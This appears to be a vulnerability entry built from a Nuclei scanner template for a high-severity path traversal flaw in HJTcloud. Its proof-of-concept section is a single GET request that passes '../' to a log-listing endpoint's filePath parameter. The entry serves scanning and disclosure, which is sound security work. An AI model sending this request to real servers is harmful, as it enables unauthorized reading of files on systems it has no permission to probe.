# Nuclei Template: HJTcloud - Local File Inclusion
**Template ID:** hjtcloud-rest-arbitrary-file-read
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`hjtcloud-rest-arbitrary-file-read.yaml`)

## Vulnerability Information & PoC

## Description
HJTcloud is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/him/api/rest/V1.0/system/log/list?filePath=../
```

## References
- https://mp.weixin.qq.com/s/w2pkj5ADN7b5uxe-wmfGbw
